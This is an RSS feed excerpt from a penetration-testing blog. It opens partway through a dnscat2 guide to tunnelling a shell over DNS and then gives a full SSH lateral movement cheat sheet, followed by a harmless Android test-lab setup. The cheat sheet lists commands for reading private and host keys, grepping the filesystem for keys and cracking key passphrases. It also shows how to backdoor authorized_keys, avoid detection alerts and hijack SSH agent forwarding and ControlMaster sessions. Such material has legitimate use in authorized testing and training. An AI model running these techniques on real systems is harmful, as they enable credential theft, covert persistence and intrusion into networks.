  &lt;li&gt;Install dsncat2 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apt-get install dnscat2 -y&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Run:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dnscat2-server yourdomain.com&lt;/code&gt; on your VPS&lt;/li&gt;
  &lt;li&gt;From the client machine you will need to run the dnscat2 payload&lt;/li&gt;
  &lt;li&gt;If your domain’s NS are configured correctly the session should be established&lt;/li&gt;
  &lt;li&gt;Enter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session -i&lt;/code&gt; to spawn an interactive session&lt;/li&gt;
  &lt;li&gt;Launch a shell using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;dnscat2-port-forwarding&quot;&gt;Dnscat2 Port Forwarding&lt;/h2&gt;

&lt;p&gt;Dnscat2 supports TCP forwarding allowing you to tunnel SSH or RDP connections over the established DNS tunnel.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;client&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 4&amp;gt; listen 127.0.0.1:22 target:22 &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Again this will slow but functional.&lt;/p&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>SSH Lateral Movement Cheat Sheet</title>
          <link>https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/</link>
          <pubDate>Thu, 03 Jun 2021 15:29:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Linux Lateral Movement</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#what-is-a-lateral-movement&quot; id=&quot;markdown-toc-what-is-a-lateral-movement&quot;&gt;What is a Lateral Movement&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ssh-lateral-movement&quot; id=&quot;markdown-toc-ssh-lateral-movement&quot;&gt;SSH Lateral Movement&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#manually-look-for-ssh-keys&quot; id=&quot;markdown-toc-manually-look-for-ssh-keys&quot;&gt;Manually Look for SSH Keys&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#search-for-files-containing-ssh-keys&quot; id=&quot;markdown-toc-search-for-files-containing-ssh-keys&quot;&gt;Search For Files Containing SSH Keys&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#identify-the-host-for-the-key&quot; id=&quot;markdown-toc-identify-the-host-for-the-key&quot;&gt;Identify The Host for the Key&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cracking-ssh-passphrase-keys&quot; id=&quot;markdown-toc-cracking-ssh-passphrase-keys&quot;&gt;Cracking SSH Passphrase Keys&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#cracking-ssh-passphrase-with-john-the-ripper&quot; id=&quot;markdown-toc-cracking-ssh-passphrase-with-john-the-ripper&quot;&gt;Cracking SSH Passphrase with John the Ripper&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ssh-passphrase-backdoor&quot; id=&quot;markdown-toc-ssh-passphrase-backdoor&quot;&gt;SSH Passphrase Backdoor&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ssh-agent-forwarding-hijacking&quot; id=&quot;markdown-toc-ssh-agent-forwarding-hijacking&quot;&gt;SSH Agent Forwarding Hijacking&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#how-ssh-agent-works&quot; id=&quot;markdown-toc-how-ssh-agent-works&quot;&gt;How SSH Agent Works&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#the-risk&quot; id=&quot;markdown-toc-the-risk&quot;&gt;The Risk&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#how-to-hijack-ssh-agent-forwarding&quot; id=&quot;markdown-toc-how-to-hijack-ssh-agent-forwarding&quot;&gt;How To Hijack SSH Agent Forwarding&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#client-instructions&quot; id=&quot;markdown-toc-client-instructions&quot;&gt;Client Instructions&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ssh-hijacking-with-controlmaster&quot; id=&quot;markdown-toc-ssh-hijacking-with-controlmaster&quot;&gt;SSH Hijacking with ControlMaster&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;what-is-a-lateral-movement&quot;&gt;What is a Lateral Movement&lt;/h2&gt;

&lt;p&gt;A lateral movement typically occurs after a host has been compromised via a reverse shell, and foothold in the network is obtained. Fully compromising the target machine by performing Linux privilege escalation or Windows privilege escalation could be advantageous due to the increased access to files or operating system functionality leveraged by a root level account.&lt;/p&gt;

&lt;p&gt;This article focuses specifically on SSH lateral movement techniques on Linux.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;ssh-lateral-movement&quot;&gt;SSH Lateral Movement&lt;/h2&gt;

&lt;p&gt;SSH private keys are typically an easy way to progress through the network, and are often found with poor permissions or duplicated in home directories. This article does not cover SSH pivoting in depth, we have a separate resource for &lt;a href=&quot;https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/&quot;&gt;SSH pivoting&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;Enumerate Non UNIX Based Hosts for Private Keys&lt;/h5&gt;
  &lt;p&gt;SSH is not specific to UNIX based operating systems, consider enumerating Windows target for SSH private keys.&lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;manually-look-for-ssh-keys&quot;&gt;Manually Look for SSH Keys&lt;/h3&gt;

&lt;p&gt;Check home directories and obvious locations for private key files:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/home/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/.ssh/authorized&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;keys 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/.ssh/identity.pub 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/.ssh/identity 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/.ssh/id&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;rsa.pub 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/.ssh/id&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;rsa 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/.ssh/id&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;dsa.pub 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/.ssh/id&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;dsa 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ssh/ssh&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;config 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ssh/sshd&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;config 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ssh/ssh&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;host&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;dsa&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;key.pub 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ssh/ssh&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;host&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;dsa&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;key 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ssh/ssh&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;host&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;rsa&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;key.pub 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ssh/ssh&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;host&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;rsa&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;key 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ssh/ssh&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;host&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;key.pub 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/ssh/ssh&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;host&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;key
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/.ssh/authorized&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;keys 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/.ssh/identity.pub 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/.ssh/identity 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/.ssh/id&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;rsa.pub 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/.ssh/id&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;rsa 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/.ssh/id&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;dsa.pub 
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/.ssh/id&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;dsa &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;search-for-files-containing-ssh-keys&quot;&gt;Search For Files Containing SSH Keys&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ir&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-----BEGIN RSA PRIVATE KEY-----&quot;&lt;/span&gt; /home/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ir&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;BEGIN DSA PRIVATE KEY&quot;&lt;/span&gt; /home/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ir&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;BEGIN RSA PRIVATE KEY&quot;&lt;/span&gt; /&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ir&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;BEGIN DSA PRIVATE KEY&quot;&lt;/span&gt; /&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;identify-the-host-for-the-key&quot;&gt;Identify The Host for the Key&lt;/h3&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Hashed known_hosts&lt;/h5&gt;
  &lt;p&gt;Modern Linux systems may hash the known_hosts file entries to help prevent against enumeration.&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;If you find a key you then need to identify what server the key is for. In an attempt to idenitfy what host the key is for the following locations should be checked:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/hosts 
~/.known_hosts
~/.bash_history 
~/.ssh/config &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;cracking-ssh-passphrase-keys&quot;&gt;Cracking SSH Passphrase Keys&lt;/h3&gt;

&lt;p&gt;If the discovered SSH key is encrypted with a passphrase this can be cracked locally (much faster), below are several methods. If you have access to a GPU hashcat should be leveraged to improve the cracking time.&lt;/p&gt;

&lt;h4 id=&quot;cracking-ssh-passphrase-with-john-the-ripper&quot;&gt;Cracking SSH Passphrase with John the Ripper&lt;/h4&gt;

&lt;p&gt;John the Ripper has a function to convert he key to a hash called john2hash.py and comes pre installed on Kali.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Convert the hash: python /usr/share/john/ssh2john.py id_rsa &amp;gt; id_rsa.hash-john&lt;/li&gt;
  &lt;li&gt;Use a comprehensive wordlist: john –wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash-john&lt;/li&gt;
  &lt;li&gt;Wait and hope&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;note warning&quot;&gt;
  &lt;h5&gt;Help Avoid Detection&lt;/h5&gt;
  &lt;p&gt;Avoid directly connecting from a unknown host to the target SSH server, use an already known host to help prevent detection alerts being issued. &lt;/p&gt;
&lt;/div&gt;

&lt;h3 id=&quot;ssh-passphrase-backdoor&quot;&gt;SSH Passphrase Backdoor&lt;/h3&gt;

&lt;p&gt;While you have access to the compromised host, it is typically a good idea to backdoor the SSH authorized_keys file which will allow for passwordless login at a point in the future. This should provide an easier and more reliable connection than exploiting and accessing via a reverse shell; and potentially reduce the risk of detection.&lt;/p&gt;

&lt;p&gt;Adding the key is simply a case of paste a SSH public key, generated on your attacking machine and pasting it into the ~/ssh/authorized_keys file on the compromised machine.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;run ssh-keygen -t rsa -b 4096&lt;/li&gt;
  &lt;li&gt;cat id_rsa.pub and copy the file contents&lt;/li&gt;
  &lt;li&gt;echo “SSH key data” » ~/.ssh/authorized_keys&lt;/li&gt;
  &lt;li&gt;Test you can connect using the private key without being prompted for a password&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;ssh-agent-forwarding-hijacking&quot;&gt;SSH Agent Forwarding Hijacking&lt;/h2&gt;

&lt;p&gt;Starting point: You have SSH already backdoored the compromised host by adding your public key to the ~/.authorized_keys file.&lt;/p&gt;

&lt;h3 id=&quot;how-ssh-agent-works&quot;&gt;How SSH Agent Works&lt;/h3&gt;

&lt;p&gt;SSH agent works by allowing the Intermediary machine to pass-through (forward) your SSH key from your client to the next downstream server, allowing the machine in the middle (potentially a bastion host) to use your key without having physical access to your key as they are not stored on the intermediate host but simply forwarded on to the downstream target server.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access the machine where the existing victim user session is established&lt;/li&gt;
  &lt;li&gt;Root level access to the machine where the victim session is established&lt;/li&gt;
  &lt;li&gt;A current victim SSH  connection with agent forwarding enabled&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Your Machine =&amp;gt; Intermediary Host (forwards your key) =&amp;gt; Downstream Machine&lt;/p&gt;

&lt;h4 id=&quot;the-risk&quot;&gt;The Risk&lt;/h4&gt;

&lt;p&gt;The primary risk of using SSH Agent Forwarding is if the intermediatory machine is compromised, and the attacker has significant permissions they could, potentially use the established session socket to gain access to downstream servers.&lt;/p&gt;

&lt;h3 id=&quot;how-to-hijack-ssh-agent-forwarding&quot;&gt;How To Hijack SSH Agent Forwarding&lt;/h3&gt;

&lt;p&gt;Attacking Machine =&amp;gt; Compromised Intermediary Host (with SSH Key) =&amp;gt; Downsteam Machine (final destination)&lt;/p&gt;

&lt;p&gt;SSH agent forwarding allows a user to connect to other machines without entering passwords. This functionality can be exploited to access any host the compromised users SSH key has access to (without having direct access to the keys), while there is an active session.&lt;/p&gt;

&lt;p&gt;A potentially easier way to think of SSH agent forwarding, is to think of it as assigning the SSH key to the active SSH session, while the session is in place it is possible to access the SSH key and connect to other machines that the SSH key has access.&lt;/p&gt;

&lt;p&gt;In order to exploit SSH agent forwarding an active session must be open between the user client (that you wish to hijack) and the compromised intermediary host. You will also require access to the host where the user is connected with superuser privileges (such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su - username&lt;/code&gt;, or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;) to access the account running the active SSH session you wish to hijack.&lt;/p&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;If -A SSH Connection Fails&lt;/h5&gt;
  &lt;p&gt;If -A fails to connect, perform the following: ```echo &quot;ForwardingAgent yes&quot; &amp;gt;&amp;gt; ~/.ssh/config``` to enable agent forwarding. &lt;/p&gt;
&lt;/div&gt;

&lt;h4 id=&quot;client-instructions&quot;&gt;Client Instructions&lt;/h4&gt;

&lt;p&gt;Run the following on your local client machine:&lt;/p&gt;

&lt;p&gt;You may need to create a new key, if so run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-add&lt;/code&gt;.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open an SSH connection using agent forwarding to the compromised host  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -A user@compromsied-host&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Verify agent forwarding is working by using: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-add -l&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Obtain root: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -s&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Gain access to the account you wish to access:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;su - victim&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Access any SSH connection the private key of the victim has access&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ssh-hijacking-with-controlmaster&quot;&gt;SSH Hijacking with ControlMaster&lt;/h3&gt;

&lt;p&gt;OpenSSH has a function called &lt;strong&gt;ControlMaster&lt;/strong&gt; that enables the sharing of multiple sessions over a single network connection. Allowing you to connect to the server once and have all other subsequent SSH sessions use the initial connection.&lt;/p&gt;

&lt;p&gt;In order to exploit SSH ControlMaster you first need shell level access to the target; you will then need sufficient privileges to modify the config of a user to enable the  ControlMaster functionality.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Gain shell level access to the target machine&lt;/li&gt;
  &lt;li&gt;Access the victim users home directory and create / modify the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.ssh/config&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Add the following configuration:&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Host &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

ControlMaster auto
~/.ssh/master-socket/%r@%h:%p
ControlPersist &lt;span class=&quot;nb&quot;&gt;yes&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;ensure the master-socket directory exists if it does not, create it  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir ~/.ssh/master-socket/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Ensure the correct permissions are in place for the config file  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 600 ~/.ssh/config&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Wait for the victim to login and establish a connection to another server&lt;/li&gt;
  &lt;li&gt;View the directory created at step 4 to observe the socket file:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -lat ~/.ssh/master-socket&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;To hijack the existing connection ssh to user@hostname / IP listed in step 7&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If you know of more techniques let me know on twitter @Arr0way&lt;/p&gt;

&lt;p&gt;Enjoy.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Android Pen Testing Environment Setup</title>
          <link>https://highon.coffee/blog/android-app-pen-testing-environment/</link>
          <pubDate>Wed, 02 Jun 2021 15:29:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Mobile App Penetration Testing</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/android-app-pen-testing-environment/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#install-genymotion&quot; id=&quot;markdown-toc-install-genymotion&quot;&gt;Install GenyMotion&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#setup-burp-proxy-with-genymotion&quot; id=&quot;markdown-toc-setup-burp-proxy-with-genymotion&quot;&gt;Setup Burp Proxy with GenyMotion&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-genymotion-burp-proxy-settings&quot; id=&quot;markdown-toc-1-genymotion-burp-proxy-settings&quot;&gt;1. GenyMotion Burp Proxy Settings&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-android-81-proxy-settings&quot; id=&quot;markdown-toc-2-android-81-proxy-settings&quot;&gt;2. Android 8.1 Proxy Settings&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-android-burp-certificate-installation&quot; id=&quot;markdown-toc-3-android-burp-certificate-installation&quot;&gt;3. Android Burp Certificate Installation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#4-burp-proxy-settings&quot; id=&quot;markdown-toc-4-burp-proxy-settings&quot;&gt;4. Burp Proxy Settings&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#5-adb&quot; id=&quot;markdown-toc-5-adb&quot;&gt;5. ADB&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#6-installing-apk-files&quot; id=&quot;markdown-toc-6-installing-apk-files&quot;&gt;6. Installing APK FIles&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#7-adb-basic-commands&quot; id=&quot;markdown-toc-7-adb-basic-commands&quot;&gt;7. ADB Basic Commands&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#8-open-gapps&quot; id=&quot;markdown-toc-8-open-gapps&quot;&gt;8. Open GApps&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This document covers the least exciting aspect of Android mobile app security testing, configuring the testing environment. It is both time consuming and an extremely important part of the assessment process to get right. This guide covers setup of GenyMotion with Burp Suite on Mac OS, but it should be trivial to replicate on Linux or Windows.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;install-genymotion&quot;&gt;Install GenyMotion&lt;/h2&gt;

&lt;p&gt;GenyMotion is the android emulator of choice for dynamic android app security testing.&lt;/p&gt;

&lt;p&gt;Installation on mac requires Virtual Box to be installed first, then run through the GenyMotion installer.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Install Android device (Nexus 4 works well)&lt;/li&gt;
  &lt;li&gt;Select Android 8.1 and deploy&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;setup-burp-proxy-with-genymotion&quot;&gt;Setup Burp Proxy with GenyMotion&lt;/h2&gt;

&lt;p&gt;If you are using DHCP you may want to statically assign an address, as the IP randomly changing requires this process to be completed again (which can get extremely annoying…).&lt;/p&gt;

&lt;h3 id=&quot;1-genymotion-burp-proxy-settings&quot;&gt;1. GenyMotion Burp Proxy Settings&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Select GenyMotion&lt;/li&gt;
  &lt;li&gt;Preferences&lt;/li&gt;
  &lt;li&gt;Network&lt;/li&gt;
  &lt;li&gt;Proxy Settings and tick HTTP and add your local interface address and a different port to one that Burp is using&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/img/android-pen-testing-env-01.png&quot; alt=&quot;Geny Motion Burp Proxy Settings&quot; title=&quot;Geny Motion Burp Proxy Settings&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;2-android-81-proxy-settings&quot;&gt;2. Android 8.1 Proxy Settings&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Swipe down the top and select Settings&lt;/li&gt;
  &lt;li&gt;Tap Network &amp;amp; Internet &amp;gt; Wi-Fi &amp;gt; Long Tap on the connected Wi-Fi network and Select Modify Network&lt;/li&gt;
  &lt;li&gt;Tap Advanced &amp;gt; Proxy &amp;gt; Manual and enter the same Proxy settings you entered in step 1&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/img/android-pen-testing-env-02.png&quot; alt=&quot;Android Burp Proxy Settings&quot; title=&quot;Android Burp Proxy Settings&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-android-burp-certificate-installation&quot;&gt;3. Android Burp Certificate Installation&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Go to your web browser and download the certifcate file from http://burp&lt;/li&gt;
  &lt;li&gt;Rename it to .cer&lt;/li&gt;
  &lt;li&gt;Drag it into the running GenyMotion phone (this will place the file at /sd-card/)&lt;/li&gt;
  &lt;li&gt;On the phone go to Settings &amp;gt; Security &amp;amp; Location &amp;gt; Encryption &amp;amp; Location &amp;gt; Install from SD card (Install certificates from SD card)&lt;/li&gt;
  &lt;li&gt;Click Downloads on the left and select the .cer file&lt;/li&gt;
  &lt;li&gt;Install the certificate and call it Burp&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/img/android-pen-testing-env-03.png&quot; alt=&quot;Android Burp Certificate Install&quot; title=&quot;Android Burp Certificate Install&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;You will need to set a pin code, set one&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;4-burp-proxy-settings&quot;&gt;4. Burp Proxy Settings&lt;/h3&gt;

&lt;p&gt;Add a Burp proxy on the interface with the IP and port used at step 1&lt;/p&gt;

&lt;h3 id=&quot;5-adb&quot;&gt;5. ADB&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Install brew&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;brew install android-platform-tools&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adb devices&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;List of devices attached
192.168.XX.XXX:5555	device&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;adb shell&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;vbox86p:/ &lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Your id should be root on GenyMotion.&lt;/p&gt;

&lt;h3 id=&quot;6-installing-apk-files&quot;&gt;6. Installing APK FIles&lt;/h3&gt;

&lt;p&gt;There are two options for installing APK files, using adb or dragging and dropping.&lt;/p&gt;

&lt;p&gt;Using ADB:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;adb &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;file.apk&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Or drag and drop the apk file into the running GenyMotion Android device.&lt;/p&gt;

&lt;h3 id=&quot;7-adb-basic-commands&quot;&gt;7. ADB Basic Commands&lt;/h3&gt;

&lt;p&gt;Installed Android application location:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /data/data&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;8-open-gapps&quot;&gt;8. Open GApps&lt;/h3&gt;

